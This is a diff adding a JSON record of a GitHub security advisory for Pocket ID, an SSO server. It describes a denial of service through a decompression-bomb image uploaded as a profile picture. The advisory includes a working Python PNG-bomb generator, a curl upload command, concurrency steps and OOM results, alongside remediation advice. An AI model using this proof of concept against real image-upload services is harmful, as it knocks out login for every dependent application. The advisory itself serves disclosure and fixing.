@@ -1,0 +1,47 @@
+{
+  "global": null,
+  "id": "GHSA-53gh-fffg-5f7f",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-400",
+      "CWE-409"
+    ],
+    "description": "## Summary\r\nAny authenticated user can crash the entire Pocket ID server by uploading a small,\r\nspecially-crafted image as their profile picture. The uploaded image is fully decoded into an\r\nin-memory bitmap **before** any dimension, pixel-count, or file-size limit is applied, so a tiny\r\nfile that declares enormous pixel dimensions (a \"decompression bomb\") forces a huge memory\r\nallocation. A handful of such uploads - a few kilobytes each - exhaust the host's memory and the\r\nLinux OOM killer terminates the `pocket-id` process. Because Pocket ID is the OIDC/SSO authority,\r\nits outage denies login to every downstream application that relies on it.\r\n\r\n## Details\r\nThe self-service endpoint `PUT /api/users/me/profile-picture`\r\n([`user_controller.go#L46`](https://github.com/pocket-id/pocket-id/blob/fa8aa447061fd096184ac9e7c3511c62087b3f8c/backend/internal/controller/user_controller.go#L46),\r\ngated by `authMiddleware.WithAdminNotRequired()` → any authenticated non-admin user) passes the\r\nuploaded file to `UserService.UpdateProfilePicture` → `profilepicture.CreateProfilePicture`.\r\nThat function decodes the image first and only then resizes it:\r\n\r\n```go\r\n// backend/internal/utils/image/profile_picture.go\r\nfunc CreateProfilePicture(file io.ReadSeeker) (io.ReadSeeker, error) {\r\n    img, _, err := imageorient.Decode(file)          // (1) decodes fully: allocates ~width*height*channels\r\n    ...\r\n    img = imaging.Fill(img, 300, 300, ...)           // (2) resize happens only AFTER the full decode\r\n```\r\n\r\nTwo compounding problems:\r\n\r\n1. **No dimension / pixel-count guard before decode.** `imageorient.Decode` (and the WebP\r\n   fallback) allocate memory proportional to the image's *declared* `width × height`, which is\r\n   independent of the compressed file size. There is no `image.DecodeConfig` pre-check to reject\r\n   oversized images. A ~140 KB grayscale PNG that declares 12000×12000 decodes to ~144 MP; a\r\n   ~762 KB PNG declaring 28000×28000 decodes to ~784 MP.\r\n\r\n2. **No size-limit middleware on the route.** Unlike the OIDC client-logo upload - which is\r\n   wrapped with `fileSizeLimitMiddleware.Add(2<<20)` - the profile-picture routes have no size\r\n   limit at all\r\n   ([`user_controller.go#L45-L46`](https://github.com/pocket-id/pocket-id/blob/fa8aa447061fd096184ac9e7c3511c62087b3f8c/backend/internal/controller/user_controller.go#L45-L46)).\r\n\r\nThe decoded memory is also not promptly returned to the OS, so repeated uploads accumulate.\r\nThe same decode path is reachable (admin-gated) through the client-logo upload and through\r\n`OidcService.downloadAndSaveLogoFromURL` (`StripMetadata`), which decode images through the same\r\nlibraries and lack the same dimension guard.\r\n\r\n**Preconditions:** a valid account and session (any non-admin user; `PR:L`). No user\r\ninteraction, default configuration. On a memory-limited deployment (a container with a\r\n256 MB-1 GB limit, common for self-hosting) a **single** small upload is sufficient.\r\n\r\n## Proof of Concept\r\nOn an isolated local instance (all traffic on 127.0.0.1):\r\n\r\n1. Build & run the backend at the tested commit and complete initial admin setup; create a\r\n   normal non-admin user and obtain its session cookie (via the admin one-time-access-token\r\n   exchange).\r\n2. Craft a decompression-bomb PNG - a small file that declares huge dimensions (grayscale,\r\n   all-zero scanlines). Minimal generator (`poc/pngbomb.py`):\r\n   ```python\r\n   import sys, struct, zlib\r\n   W = H = int(sys.argv[1]); out = sys.argv[2]\r\n   def chunk(t, d): return struct.pack(\">I\", len(d)) + t + d + struct.pack(\">I\", zlib.crc32(t+d) & 0xffffffff)\r\n   co = zlib.compressobj(9); idat = bytearray(); row = b\"\\x00\" + b\"\\x00\"*W\r\n   for _ in range(H): idat += co.compress(row)\r\n   idat += co.flush()\r\n   open(out, \"wb\").write(b\"\\x89PNG\\r\\n\\x1a\\n\" + chunk(b\"IHDR\", struct.pack(\">IIBBBBB\", W, H, 8, 0, 0, 0, 0)) + chunk(b\"IDAT\", bytes(idat)) + chunk(b\"IEND\", b\"\"))\r\n   ```\r\n   `python3 poc/pngbomb.py 12000 bomb.png`  →  a **140 KB** file that decodes to ~144 MP.\r\n3. Upload it as the non-admin user's profile picture and watch the server's memory:\r\n   ```bash\r\n   curl -b user_cookies.txt -X PUT http://127.0.0.1:1411/api/users/me/profile-picture \\\r\n        -F 'file=@bomb.png;type=image/png'      # -> HTTP 204\r\n   ```\r\n4. Fire ~8 of these concurrently to exhaust memory.\r\n\r\n**Observed (live lab, reproduced ≥3×):**\r\n- One 140 KB upload: server RSS **53 MB → 760 MB** (~5400× amplification).\r\n- One 762 KB upload (28000×28000): RSS → **3.6 GB**.\r\n- A control upload of a legitimate 200×200 image leaves RSS unchanged (58→59 MB); the same\r\n  bomb sent **without** a session is rejected (HTTP 401) - confirming the trigger is the\r\n  attacker-controlled dimensions decoded by an authenticated request, not uploads in general.\r\n- 8 × 140 KB concurrent uploads (~1.1 MB total) drove RSS past 3.8 GB and the kernel OOM killer\r\n  terminated the process:\r\n  ```\r\n  Out of memory: Killed process <pid> (pocket-id) total-vm:7627632kB, anon-rss:4458332kB\r\n  ```\r\n\r\n## Impact\r\nAvailability (`A:H`): any authenticated user can force the single-process IdP to consume\r\nunbounded memory and be OOM-killed, taking down authentication for the instance and, by\r\nextension, single-sign-on for every relying application. On memory-capped container\r\ndeployments a single small request suffices. No confidentiality or integrity impact. Scored\r\n`S:U` = 6.5; if the downstream SSO-wide outage is treated as a scope change (`S:C`) the vector\r\nis 7.7 (High).\r\n\r\n## Remediation\r\n- Read only the header with `image.DecodeConfig` and **reject images whose `width × height`\r\n  (or either dimension) exceeds a sane cap** (e.g. 50 MP, or 8192×8192) *before* calling\r\n  `imageorient.Decode` / `webp.Decode`.\r\n- Add `fileSizeLimitMiddleware` to the profile-picture routes, mirroring the 2 MB cap already\r\n  applied to the client-logo upload.\r\n- Apply the same dimension guard to the other image-decode sinks: the client-logo upload and\r\n  `OidcService.downloadAndSaveLogoFromURL` (`StripMetadata`).\r\n- Optionally decode within a bounded-memory worker / with a total-pixel budget.",
+    "ghsa_id": "GHSA-53gh-fffg-5f7f",
+    "html_url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-53gh-fffg-5f7f",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-53gh-fffg-5f7f"
+      }
+    ],
+    "published_at": "2026-10-09T18:05:19Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Denial of service via image decompression bomb in profile-picture upload",
+    "updated_at": "2026-10-09T18:05:19Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/pocket-id/pocket-id/backend"
+        },
+        "patched_versions": "v2.15.0",
+        "vulnerable_version_range": "<= v2.14.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "pocket-id/pocket-id"
+}
